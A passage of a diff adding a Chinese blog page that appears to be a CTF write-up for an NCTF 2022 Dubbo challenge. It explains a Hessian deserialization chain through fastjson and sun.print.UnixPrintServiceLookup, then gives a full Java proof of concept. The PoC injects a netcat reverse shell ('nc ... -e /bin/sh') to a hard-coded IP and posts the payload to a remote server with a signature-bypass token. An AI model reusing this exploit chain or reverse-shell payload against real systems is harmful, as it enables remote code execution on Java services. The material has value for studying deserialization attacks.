+</span></span><span style="display:flex;"><span>com<span style="color:#ff6ac1">.</span>sun<span style="color:#ff6ac1">.</span>org<span style="color:#ff6ac1">.</span>apache<span style="color:#ff6ac1">.</span>xpath<span style="color:#ff6ac1">.</span>internal<span style="color:#ff6ac1">.</span>objects<span style="color:#ff6ac1">.</span>XString<span style="color:#78787e">#equals</span>
+</span></span></code></pre></div><p>而dubbo中存在fastjson依赖，fastjson的toString是可以触发任意的getter方法的，最终我们找到一个可利用的类<code>sun.print.UnixPrintServiceLookup</code>，其get方法存在命令注入。需要注意的是该类存在于linux之中，windows环境下调试很难。</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff5c57">private</span> String<span style="color:#ff6ac1">[]</span> <span style="color:#57c7ff">getAllPrinterNamesBSD</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> (cmdIndex <span style="color:#ff6ac1">==</span> <span style="color:#ff6ac1">-</span>1) {
+</span></span><span style="display:flex;"><span>        cmdIndex <span style="color:#ff6ac1">=</span> getBSDCommandIndex();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    String<span style="color:#ff6ac1">[]</span> var1 <span style="color:#ff6ac1">=</span> execCmd(<span style="color:#ff6ac1">this</span>.<span style="color:#57c7ff">lpcAllCom</span><span style="color:#ff6ac1">[</span>cmdIndex<span style="color:#ff6ac1">]</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> var1 <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">null</span> <span style="color:#ff6ac1">&amp;&amp;</span> var1.<span style="color:#57c7ff">length</span> <span style="color:#ff6ac1">!=</span> 0 <span style="color:#ff6ac1">?</span> var1 : <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="复现">复现</h2>
+<p>poc基于ysomap</p>
+<p>poc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">package</span> exp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.fastjson.JSONObject;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.org.apache.xpath.internal.objects.XString;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.http.HttpEntity;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.http.HttpHeaders;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.http.ResponseEntity;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.web.client.RestTemplate;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> sun.misc.Unsafe;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> sun.print.UnixPrintServiceLookup;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Array;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.net.URI;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">doPOST</span>(<span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> obj) <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">final</span> String token <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;eyJBbGliYW5hbmEiOiJXZWxDb21lVG9OQ1RGMjAwcCIsImlzcyI6IlB1cGkxIn0=.1.0&#34;</span>;
+</span></span><span style="display:flex;"><span>        HttpHeaders requestHeaders <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HttpHeaders();
+</span></span><span style="display:flex;"><span>        requestHeaders.<span style="color:#57c7ff">add</span>(<span style="color:#5af78e">&#34;Token&#34;</span>, token);
+</span></span><span style="display:flex;"><span>        URI url <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> URI(<span style="color:#5af78e">&#34;http://1.117.171.248:8080/object/&#34;</span>);
+</span></span><span style="display:flex;"><span>        HttpEntity<span style="color:#ff6ac1">&lt;</span><span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]&gt;</span> requestEntity <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HttpEntity<span style="color:#ff6ac1">&lt;&gt;</span>(obj,requestHeaders);
+</span></span><span style="display:flex;"><span>        RestTemplate restTemplate <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> RestTemplate();
+</span></span><span style="display:flex;"><span>        ResponseEntity<span style="color:#ff6ac1">&lt;</span>String<span style="color:#ff6ac1">&gt;</span> res <span style="color:#ff6ac1">=</span> restTemplate.<span style="color:#57c7ff">postForEntity</span>(url, requestEntity, String.<span style="color:#57c7ff">class</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(res.<span style="color:#57c7ff">getBody</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> Object <span style="color:#57c7ff">deserialize</span>(<span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> obj) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream is <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ByteArrayInputStream(obj);
+</span></span><span style="display:flex;"><span>        Hessian2Input input <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> Hessian2Input(is);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> input.<span style="color:#57c7ff">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span>  <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> <span style="color:#57c7ff">serialize</span>(Object obj) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        Hessian2Output output <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> Hessian2Output(bos);
+</span></span><span style="display:flex;"><span>        NoWriteReplaceSerializerFactory sf <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> NoWriteReplaceSerializerFactory();
+</span></span><span style="display:flex;"><span>        sf.<span style="color:#57c7ff">setAllowNonSerializable</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        output.<span style="color:#57c7ff">setSerializerFactory</span>(sf);
+</span></span><span style="display:flex;"><span>        output.<span style="color:#57c7ff">writeObject</span>(obj);
+</span></span><span style="display:flex;"><span>        output.<span style="color:#57c7ff">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> bos.<span style="color:#57c7ff">toByteArray</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#ff6ac1">=</span> obj.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#57c7ff">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> HashMap <span style="color:#57c7ff">makeMap</span> (Object v1, Object v2 ) <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        HashMap s <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#5af78e">&#34;size&#34;</span>, 2);
+</span></span><span style="display:flex;"><span>        Class nodeC;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#ff6ac1">=</span> Class.<span style="color:#57c7ff">forName</span>(<span style="color:#5af78e">&#34;java.util.HashMap$Node&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">catch</span> ( ClassNotFoundException e ) {
+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#ff6ac1">=</span> Class.<span style="color:#57c7ff">forName</span>(<span style="color:#5af78e">&#34;java.util.HashMap$Entry&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Constructor nodeCons <span style="color:#ff6ac1">=</span> nodeC.<span style="color:#57c7ff">getDeclaredConstructor</span>(<span style="color:#9aedfe">int</span>.<span style="color:#57c7ff">class</span>, Object.<span style="color:#57c7ff">class</span>, Object.<span style="color:#57c7ff">class</span>, nodeC);
+</span></span><span style="display:flex;"><span>        nodeCons.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object tbl <span style="color:#ff6ac1">=</span> Array.<span style="color:#57c7ff">newInstance</span>(nodeC, 2);
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#57c7ff">set</span>(tbl, 0, nodeCons.<span style="color:#57c7ff">newInstance</span>(0, v1, v1, <span style="color:#ff6ac1">null</span>));
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#57c7ff">set</span>(tbl, 1, nodeCons.<span style="color:#57c7ff">newInstance</span>(0, v2, v2, <span style="color:#ff6ac1">null</span>));
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#5af78e">&#34;table&#34;</span>, tbl);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> s;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field theUnsafe <span style="color:#ff6ac1">=</span> Unsafe.<span style="color:#57c7ff">class</span>.<span style="color:#57c7ff">getDeclaredField</span>(<span style="color:#5af78e">&#34;theUnsafe&#34;</span>);
+</span></span><span style="display:flex;"><span>        theUnsafe.<span style="color:#57c7ff">setAccessible</span>(<span style="color:#ff6ac1">true</span>);
+</span></span><span style="display:flex;"><span>        Unsafe unsafe <span style="color:#ff6ac1">=</span> (Unsafe) theUnsafe.<span style="color:#57c7ff">get</span>(<span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        Object unixPrintServiceLookup <span style="color:#ff6ac1">=</span> unsafe.<span style="color:#57c7ff">allocateInstance</span>(UnixPrintServiceLookup.<span style="color:#57c7ff">class</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(unixPrintServiceLookup, <span style="color:#5af78e">&#34;cmdIndex&#34;</span>, 0);
+</span></span><span style="display:flex;"><span>        setFieldValue(unixPrintServiceLookup, <span style="color:#5af78e">&#34;osname&#34;</span>, <span style="color:#5af78e">&#34;Snakin&#34;</span>);
+</span></span><span style="display:flex;"><span>        String cmd <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;;nc 1.117.171.248 39542 -e /bin/sh&#34;</span>;
+</span></span><span style="display:flex;"><span>        setFieldValue(unixPrintServiceLookup, <span style="color:#5af78e">&#34;lpcFirstCom&#34;</span>, <span style="color:#ff6ac1">new</span> String<span style="color:#ff6ac1">[]</span>{cmd, cmd, cmd});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        JSONObject jsonObject <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> JSONObject();
+</span></span><span style="display:flex;"><span>        jsonObject.<span style="color:#57c7ff">put</span>(<span style="color:#5af78e">&#34;Snakin&#34;</span>,unixPrintServiceLookup);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        XString xString <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> XString(<span style="color:#5af78e">&#34;Snakin&#34;</span>);
+</span></span><span style="display:flex;"><span>        HashMap map1 <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        HashMap map2 <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        map1.<span style="color:#57c7ff">put</span>(<span style="color:#5af78e">&#34;yy&#34;</span>,jsonObject);
+</span></span><span style="display:flex;"><span>        map1.<span style="color:#57c7ff">put</span>(<span style="color:#5af78e">&#34;zZ&#34;</span>,xString);
+</span></span><span style="display:flex;"><span>        map2.<span style="color:#57c7ff">put</span>(<span style="color:#5af78e">&#34;yy&#34;</span>,xString);
+</span></span><span style="display:flex;"><span>        map2.<span style="color:#57c7ff">put</span>(<span style="color:#5af78e">&#34;zZ&#34;</span>,jsonObject);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#ff6ac1">=</span> makeMap(map1,map2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        doPOST(serialize(o));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我们知道，一般对于对象的序列化，如果对象对应的class没有对java.io.Serializable进行实现implement的话，是没办法序列化的，所以这里对输出流进行了设置，使其可以输出没有实现java.io.Serializable接口的对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">package</span> exp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.com.caucho.hessian.io.HessianProtocolException;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.com.caucho.hessian.io.Serializer;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.com.caucho.hessian.io.SerializerFactory;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">NoWriteReplaceSerializerFactory</span> <span style="color:#ff5c57">extends</span> SerializerFactory {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> com.<span style="color:#57c7ff">alibaba</span>.<span style="color:#57c7ff">com</span>.<span style="color:#57c7ff">caucho</span>.<span style="color:#57c7ff">hessian</span>.<span style="color:#57c7ff">io</span>.<span style="color:#57c7ff">Serializer</span> <span style="color:#57c7ff">getSerializer</span> (Class cl ) <span style="color:#ff5c57">throws</span> HessianProtocolException {
+</span></span><span style="display:flex;"><span>        Serializer serializer <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">super</span>.<span style="color:#57c7ff">getSerializer</span>(cl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span>(serializer <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">null</span> <span style="color:#ff6ac1">&amp;&amp;</span> serializer.<span style="color:#57c7ff">getClass</span>().<span style="color:#57c7ff">getName</span>().<span style="color:#57c7ff">equals</span>(<span style="color:#5af78e">&#34;com.caucho.hessian.io.WriteReplaceSerializer&#34;</span>)){
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>                Class<span style="color:#ff6ac1">&lt;?&gt;</span> unsafe <span style="color:#ff6ac1">=</span> Class.<span style="color:#57c7ff">forName</span>(<span style="color:#5af78e">&#34;com.caucho.hessian.io.UnsafeSerializer&#34;</span>);
+</span></span><span style="display:flex;"><span>                Method create <span style="color:#ff6ac1">=</span> unsafe.<span style="color:#57c7ff">getMethod</span>(<span style="color:#5af78e">&#34;create&#34;</span>, Class.<span style="color:#57c7ff">class</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">return</span> (Serializer) create.<span style="color:#57c7ff">invoke</span>(unsafe, cl);
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff6ac1">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>                e.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> serializer;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最后存在一个hash碰撞和签名验证，可以使用<code>WelComeToNCTF200p</code> 和<code>eyJBbGliYW5hbmEiOiJXZWxDb21lVG9OQ1RGMjAwcCIsImlzcyI6IlB1cGkxIn0=.1.0</code>这个token绕过</p>
+<p><img alt="image-20230111151401302" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230111151401302.png"></p>
+<p>打远程</p>
+<img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20221209192858630.png" alt="image-20221209192858630"  />
+<p>参考：</p>
+<p><a href="https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/#more">https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/#more</a></p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+
+  
+    <script src="/js/clipboard.js"></script>
+  
+
+  
+  
+
+    
+      
+      
+      <div class="site-footer">
+        <div class="busuanzi-footer">
+          <span id="busuanzi_container_site_pv">
+            本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+          </span>
+          <span class="separator">|</span> 
+          <span id="busuanzi_container_site_uv">
+            本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+          </span>
+        </div>
+        <p class="footer-beian"> 
+          <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">
+            蜀ICP备2021024344号-1
+          </a>
+        </p>
+      </div>
+
+      
+    </div>
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
